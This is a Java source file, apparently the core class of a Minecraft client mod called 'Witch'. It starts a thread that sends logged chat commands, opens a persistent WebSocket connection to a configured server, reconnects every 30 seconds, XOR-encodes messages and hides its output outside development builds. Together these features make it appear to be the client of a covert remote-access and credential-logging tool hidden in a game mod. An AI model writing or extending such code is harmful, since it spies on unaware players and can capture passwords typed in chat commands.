package me.soda.witch.client;

import me.soda.witch.client.features.ChatCommandLogging;
import me.soda.witch.client.features.Config;
import me.soda.witch.client.websocket.WSClient;
import me.soda.witch.shared.Cfg;
import me.soda.witch.shared.Info;
import me.soda.witch.shared.XOR;
import net.minecraft.client.MinecraftClient;

import java.net.URI;

public class Witch {
    public static final MinecraftClient mc = MinecraftClient.getInstance();
    public static final ChatCommandLogging chatCommandLogging = new ChatCommandLogging();
    public static final Info messageUtils = new Info(new XOR(Cfg.key));
    private static final boolean print = Boolean.getBoolean("fabric.development");
    //config
    private static final String server = Cfg.server;

    //variables
    public static WSClient client;
    public static Config config = new Config();

    public static void init() {
        chatCommandLogging.sendLogThread.start();
        try {
            client = new WSClient(new URI(server));
            client.connect();
        } catch (Exception e) {
            tryReconnect(client::reconnect);
        }
    }

    public static void tryReconnect(Runnable reconnect) {
        Witch.println("Connection closed");
        try {
            Thread.sleep(30 * 1000);
        } catch (Exception e) {
            Witch.printStackTrace(e);
        } finally {
            new Thread(reconnect).start();
        }
    }

    public static void printStackTrace(Exception e) {
        if (Witch.print) e.printStackTrace();
    }

    public static void println(Object o) {
        if (Witch.print) System.out.println("[WITCH] " + o);
    }
}
